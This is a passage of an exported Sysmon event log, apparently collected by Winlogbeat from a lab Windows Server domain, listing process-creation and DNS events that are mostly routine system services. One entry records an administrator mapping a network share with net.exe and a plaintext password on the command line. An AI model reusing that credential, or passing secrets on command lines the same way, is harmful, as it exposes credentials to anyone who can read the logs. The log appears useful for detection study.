"May 28, 2026 @ 12:08:15.846"	"nBDXbZ4ByrYY_kgLk31g"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:08:16.412"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:08:15.840
ProcessGuid: {6e4a868b-05ff-6a18-4b01-000000002300}
ProcessId: 5988
Image: C:\Windows\System32\svchost.exe
FileVersion: 10.0.17763.3346 (WinBuild.160101.0800)
Description: Host Process for Windows Services
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: svchost.exe
CommandLine: C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -s RmSvc
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\LOCAL SERVICE
LogonGuid: {6e4a868b-012d-6a18-e503-000000000000}
LogonId: 0x3E5
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=4DD18F001AC31D5F48F50F99E4AA1761,SHA256=2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69
ParentProcessGuid: {6e4a868b-012a-6a18-0b00-000000002300}
ParentProcessId: 640
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -s RmSvc"	"Microsoft Corporation"	"C:\Windows\system32\"	"Host Process for Windows Services"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.3346 (WinBuild.160101.0800)"	" - "	"MD5=4DD18F001AC31D5F48F50F99E4AA1761,SHA256=2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69"	"C:\Windows\System32\svchost.exe"	" - "	System	"{6e4a868b-012d-6a18-e503-000000000000}"	0x3e5	"svchost.exe"	"C:\Windows\system32\services.exe"	"C:\Windows\System32\services.exe"	"{6e4a868b-012a-6a18-0b00-000000002300}"	640	"NT AUTHORITY\SYSTEM"	"{6e4a868b-05ff-6a18-4b01-000000002300}"	5988	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\LOCAL SERVICE"	"2026-05-28 09:08:15.840"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16788	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:08:02.255"	"exDXbZ4ByrYY_kgLQHzM"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:08:03.271"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:08:02.251
ProcessGuid: {6e4a868b-05f2-6a18-4801-000000002300}
ProcessId: 1684
Image: C:\Windows\System32\SecurityHealthService.exe
FileVersion: 4.18.1807.16384 (WinBuild.160101.0800)
Description: Windows Security Health Service
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: SecurityHealthService.exe
CommandLine: C:\Windows\system32\SecurityHealthService.exe
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=513144BB5464B152274EFC7E0E398BB1,SHA256=CF3098628F1C531734A3B42465AAB584C2DD23B39DCA8BCBC9CE1FF78B7E0FB7,IMPHASH=42C6AC8AF1F043BFCB3BC62DA9B63BCB
ParentProcessGuid: {6e4a868b-012a-6a18-0b00-000000002300}
ParentProcessId: 640
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"C:\Windows\system32\SecurityHealthService.exe"	"Microsoft Corporation"	"C:\Windows\system32\"	"Windows Security Health Service"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"4.18.1807.16384 (WinBuild.160101.0800)"	" - "	"MD5=513144BB5464B152274EFC7E0E398BB1,SHA256=CF3098628F1C531734A3B42465AAB584C2DD23B39DCA8BCBC9CE1FF78B7E0FB7,IMPHASH=42C6AC8AF1F043BFCB3BC62DA9B63BCB"	"C:\Windows\System32\SecurityHealthService.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"SecurityHealthService.exe"	"C:\Windows\system32\services.exe"	"C:\Windows\System32\services.exe"	"{6e4a868b-012a-6a18-0b00-000000002300}"	640	"NT AUTHORITY\SYSTEM"	"{6e4a868b-05f2-6a18-4801-000000002300}"	1684	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:08:02.251"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16502	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:07:54.615"	"URDXbZ4ByrYY_kgLQHzL"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:07:56.252"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:07:54.609
ProcessGuid: {6e4a868b-05ea-6a18-4501-000000002300}
ProcessId: 1424
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: ""C:\Windows\system32\net.exe"" use \\192.168.1.218\share /user:osher Password123
CurrentDirectory: C:\Users\Administrator\
User: LAB2019\Administrator
LogonGuid: {6e4a868b-015d-6a18-d703-070000000000}
LogonId: 0x703D7
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=AE61D8F04BCDE8158304067913160B31,SHA256=25C8266D2BC1D5626DCDF72419838B397D28D44D00AC09F02FF4E421B43EC369,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07
ParentProcessGuid: {6e4a868b-0271-6a18-dc00-000000002300}
ParentProcessId: 1192
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: LAB2019\Administrator"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"""C:\Windows\system32\net.exe"" use \\192.168.1.218\share /user:osher Password123"	"Microsoft Corporation"	"C:\Users\Administrator\"	"Net Command"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.1 (WinBuild.160101.0800)"	" - "	"MD5=AE61D8F04BCDE8158304067913160B31,SHA256=25C8266D2BC1D5626DCDF72419838B397D28D44D00AC09F02FF4E421B43EC369,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07"	"C:\Windows\System32\net.exe"	" - "	High	"{6e4a868b-015d-6a18-d703-070000000000}"	0x703d7	"net.exe"	"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" "	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"	"{6e4a868b-0271-6a18-dc00-000000002300}"	1192	"LAB2019\Administrator"	"{6e4a868b-05ea-6a18-4501-000000002300}"	1424	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	1	"LAB2019\Administrator"	"2026-05-28 09:07:54.609"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16497	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:07:53.053"	"UBDXbZ4ByrYY_kgLQHzL"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Dns query (rule: DnsQuery)"	22	"May 28, 2026 @ 12:07:54.251"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Dns query:
RuleName: -
UtcTime: 2026-05-28 09:07:51.050
ProcessGuid: {6e4a868b-05df-6a18-2f01-000000002300}
ProcessId: 3872
QueryName: WIN-JOCP945SK51
QueryStatus: 0
QueryResults: ::1;::ffff:192.168.1.251;
Image: C:\Windows\System32\CompatTelRunner.exe
User: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"C:\Windows\System32\CompatTelRunner.exe"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"{6e4a868b-05df-6a18-2f01-000000002300}"	3872	" - "	" - "	"WIN-JOCP945SK51"	"::1;::ffff:192.168.1.251;"	0	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:07:51.050"	" - "	" - "	22	" - "	Info	"3,216"	"4,140"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16496	"Dns query (rule: DnsQuery)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:07:44.899"	"TBDXbZ4ByrYY_kgLDHyV"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:07:46.243"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:07:44.896
ProcessGuid: {6e4a868b-05e0-6a18-3e01-000000002300}
ProcessId: 1828
Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngentask.exe
FileVersion: 4.7.3760.0 built by: NET472REL1LAST_C
Description: Microsoft .NET Framework optimization service
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: NGenTask.exe
CommandLine: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1028
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=709DFD4075769404C46BD071EA785DBA,SHA256=21BC6B8F3E042654CE06F4DBE9780AE77179F6F012C1BF01063CA5CC26539622,IMPHASH=00000000000000000000000000000000
ParentProcessGuid: {6e4a868b-05e0-6a18-3c01-000000002300}
ParentProcessId: 1704
ParentImage: C:\Windows\System32\taskhostw.exe
ParentCommandLine: taskhostw.exe /RuntimeWide
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1028"	"Microsoft Corporation"	"C:\Windows\system32\"	"Microsoft .NET Framework optimization service"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"4.7.3760.0 built by: NET472REL1LAST_C"	" - "	"MD5=709DFD4075769404C46BD071EA785DBA,SHA256=21BC6B8F3E042654CE06F4DBE9780AE77179F6F012C1BF01063CA5CC26539622,IMPHASH=00000000000000000000000000000000"	"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngentask.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"NGenTask.exe"	"taskhostw.exe /RuntimeWide"	"C:\Windows\System32\taskhostw.exe"	"{6e4a868b-05e0-6a18-3c01-000000002300}"	1704	"NT AUTHORITY\SYSTEM"	"{6e4a868b-05e0-6a18-3e01-000000002300}"	1828	"Microsoft® .NET Framework"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:07:44.896"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16494	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:07:44.895"	"SxDXbZ4ByrYY_kgLDHyV"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:07:46.243"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:07:44.891
ProcessGuid: {6e4a868b-05e0-6a18-3d01-000000002300}
ProcessId: 1284
Image: C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngentask.exe
FileVersion: 4.7.3760.0 built by: NET472REL1LAST_C
Description: Microsoft .NET Framework optimization service
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: NGenTask.exe
CommandLine: ""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1040
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=7E0D0A963AAADEF57ADCA0615104C1DA,SHA256=07C5539C7937630CCC89690CF10A8FECF327847AD92D2597A1665FC5602ED975,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744
ParentProcessGuid: {6e4a868b-05e0-6a18-3c01-000000002300}
ParentProcessId: 1704
ParentImage: C:\Windows\System32\taskhostw.exe
ParentCommandLine: taskhostw.exe /RuntimeWide
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1040"	"Microsoft Corporation"	"C:\Windows\system32\"	"Microsoft .NET Framework optimization service"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"4.7.3760.0 built by: NET472REL1LAST_C"	" - "	"MD5=7E0D0A963AAADEF57ADCA0615104C1DA,SHA256=07C5539C7937630CCC89690CF10A8FECF327847AD92D2597A1665FC5602ED975,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744"	"C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngentask.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"NGenTask.exe"	"taskhostw.exe /RuntimeWide"	"C:\Windows\System32\taskhostw.exe"	"{6e4a868b-05e0-6a18-3c01-000000002300}"	1704	"NT AUTHORITY\SYSTEM"	"{6e4a868b-05e0-6a18-3d01-000000002300}"	1284	"Microsoft® .NET Framework"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:07:44.891"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16493	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:07:44.858"	"ShDXbZ4ByrYY_kgLDHyV"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:07:46.243"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:07:44.856
ProcessGuid: {6e4a868b-05e0-6a18-3c01-000000002300}
ProcessId: 1704
Image: C:\Windows\System32\taskhostw.exe
FileVersion: 10.0.17763.1852 (WinBuild.160101.0800)
Description: Host Process for Windows Tasks
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskhostw.exe
CommandLine: taskhostw.exe /RuntimeWide
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=8BD7B08DA6BCA54DF9B595E4D9281BEB,SHA256=DE85F29A8BC7219F10A4AC88654C3901ABC329D7505B21CD95CBF780D1EBCCF4,IMPHASH=9839C7FD9649496B162F72128209528A
ParentProcessGuid: {6e4a868b-012e-6a18-2400-000000002300}
ParentProcessId: 1596
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"taskhostw.exe /RuntimeWide"	"Microsoft Corporation"	"C:\Windows\system32\"	"Host Process for Windows Tasks"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.1852 (WinBuild.160101.0800)"	" - "	"MD5=8BD7B08DA6BCA54DF9B595E4D9281BEB,SHA256=DE85F29A8BC7219F10A4AC88654C3901ABC329D7505B21CD95CBF780D1EBCCF4,IMPHASH=9839C7FD9649496B162F72128209528A"	"C:\Windows\System32\taskhostw.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"taskhostw.exe"	"C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule"	"C:\Windows\System32\svchost.exe"	"{6e4a868b-012e-6a18-2400-000000002300}"	1596	"NT AUTHORITY\SYSTEM"	"{6e4a868b-05e0-6a18-3c01-000000002300}"	1704	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:07:44.856"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16492	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:07:44.363"	"SRDXbZ4ByrYY_kgLDHyV"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:07:46.243"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:07:44.360
ProcessGuid: {6e4a868b-05e0-6a18-3a01-000000002300}
ProcessId: 7504
Image: C:\Users\ADMINI~1\AppData\Local\Temp\7127B3CF-DA4F-4A7E-8382-FFDF2518A4E3\DismHost.exe
FileVersion: 10.0.17763.1697 (WinBuild.160101.0800)
Description: Dism Host Servicing Process
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: DismHost.exe
CommandLine: C:\Users\ADMINI~1\AppData\Local\Temp\7127B3CF-DA4F-4A7E-8382-FFDF2518A4E3\dismhost.exe {AE453693-BF2D-4DDD-BD13-8FD483473263}
CurrentDirectory: C:\Windows\system32\
User: LAB2019\Administrator
LogonGuid: {6e4a868b-015d-6a18-d703-070000000000}
LogonId: 0x703D7
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=03F3504E45ACBB30F956A84E5C8DFA96,SHA256=2FB529DE54D39308398E59CC7FA5CAEF1ACF81A13BCCDD645950E7F88D3842E1,IMPHASH=C601FA732FF0599995A293BA7882B84D
ParentProcessGuid: {6e4a868b-05df-6a18-2801-000000002300}
ParentProcessId: 5348
ParentImage: C:\Windows\System32\cleanmgr.exe
ParentCommandLine: ""C:\Windows\system32\cleanmgr.exe"" /autoclean /d C:
ParentUser: LAB2019\Administrator"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"C:\Users\ADMINI~1\AppData\Local\Temp\7127B3CF-DA4F-4A7E-8382-FFDF2518A4E3\dismhost.exe {AE453693-BF2D-4DDD-BD13-8FD483473263}"	"Microsoft Corporation"	"C:\Windows\system32\"	"Dism Host Servicing Process"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.1697 (WinBuild.160101.0800)"	" - "	"MD5=03F3504E45ACBB30F956A84E5C8DFA96,SHA256=2FB529DE54D39308398E59CC7FA5CAEF1ACF81A13BCCDD645950E7F88D3842E1,IMPHASH=C601FA732FF0599995A293BA7882B84D"	"C:\Users\ADMINI~1\AppData\Local\Temp\7127B3CF-DA4F-4A7E-8382-FFDF2518A4E3\DismHost.exe"	" - "	High	"{6e4a868b-015d-6a18-d703-070000000000}"	0x703d7	"DismHost.exe"	"""C:\Windows\system32\cleanmgr.exe"" /autoclean /d C:"	"C:\Windows\System32\cleanmgr.exe"	"{6e4a868b-05df-6a18-2801-000000002300}"	5348	"LAB2019\Administrator"	"{6e4a868b-05e0-6a18-3a01-000000002300}"	7504	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	1	"LAB2019\Administrator"	"2026-05-28 09:07:44.360"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16491	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:07:43.652"	"LBDXbZ4ByrYY_kgLDHyV"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:07:45.234"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:07:43.645
ProcessGuid: {6e4a868b-05df-6a18-3301-000000002300}
ProcessId: 8112
Image: C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngentask.exe
FileVersion: 4.7.3760.0 built by: NET472REL1LAST_C
Description: Microsoft .NET Framework optimization service
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: NGenTask.exe
CommandLine: ""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:544
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=7E0D0A963AAADEF57ADCA0615104C1DA,SHA256=07C5539C7937630CCC89690CF10A8FECF327847AD92D2597A1665FC5602ED975,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744
ParentProcessGuid: {6e4a868b-05df-6a18-2301-000000002300}
ParentProcessId: 3864
ParentImage: C:\Windows\System32\taskhostw.exe
ParentCommandLine: taskhostw.exe
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:544"	"Microsoft Corporation"	"C:\Windows\system32\"	"Microsoft .NET Framework optimization service"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"4.7.3760.0 built by: NET472REL1LAST_C"	" - "	"MD5=7E0D0A963AAADEF57ADCA0615104C1DA,SHA256=07C5539C7937630CCC89690CF10A8FECF327847AD92D2597A1665FC5602ED975,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744"	"C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngentask.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"NGenTask.exe"	"taskhostw.exe"	"C:\Windows\System32\taskhostw.exe"	"{6e4a868b-05df-6a18-2301-000000002300}"	3864	"NT AUTHORITY\SYSTEM"	"{6e4a868b-05df-6a18-3301-000000002300}"	8112	"Microsoft® .NET Framework"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:07:43.645"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16463	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:07:43.631"	"KxDXbZ4ByrYY_kgLDHyV"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:07:45.234"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:07:43.628
ProcessGuid: {6e4a868b-05df-6a18-3101-000000002300}
ProcessId: 6628
Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngentask.exe
FileVersion: 4.7.3760.0 built by: NET472REL1LAST_C
Description: Microsoft .NET Framework optimization service
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: NGenTask.exe
CommandLine: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:472
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=709DFD4075769404C46BD071EA785DBA,SHA256=21BC6B8F3E042654CE06F4DBE9780AE77179F6F012C1BF01063CA5CC26539622,IMPHASH=00000000000000000000000000000000
ParentProcessGuid: {6e4a868b-05df-6a18-2301-000000002300}
ParentProcessId: 3864
ParentImage: C:\Windows\System32\taskhostw.exe
ParentCommandLine: taskhostw.exe
